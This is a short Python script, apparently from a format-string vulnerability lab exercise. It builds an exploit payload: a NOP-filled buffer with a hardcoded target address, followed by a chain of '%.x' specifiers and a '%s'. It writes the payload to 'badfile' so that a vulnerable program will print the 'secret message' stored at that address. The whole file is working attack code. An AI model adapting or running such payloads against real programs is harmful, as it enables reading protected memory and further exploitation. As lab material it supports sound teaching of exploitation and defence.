#!/usr/bin/python3
import sys

N = 1500

# Initialize payload with 1500 bytes
# content = bytearray(0x0 for _ in range(N))

# Fill the content with NOP's
content = bytearray(0x90 for i in range(N))

# Address of the secret message
# secret_msg_addr = 0x080af014
secret_msg_addr = 0xffffc920
content[0:4]  =  (secret_msg_addr).to_bytes(4,byteorder='little')

s = "%.x" * 70 + "%s\n"
fmt = s.encode('latin-1')

offset=4

# Store the format string in the payload
content[offset:offset+len(fmt)] = fmt

# Write payload to badfile
with open('badfile', 'wb') as f:
    f.write(content)

# Output payload for testing
sys.stdout.buffer.write(content)
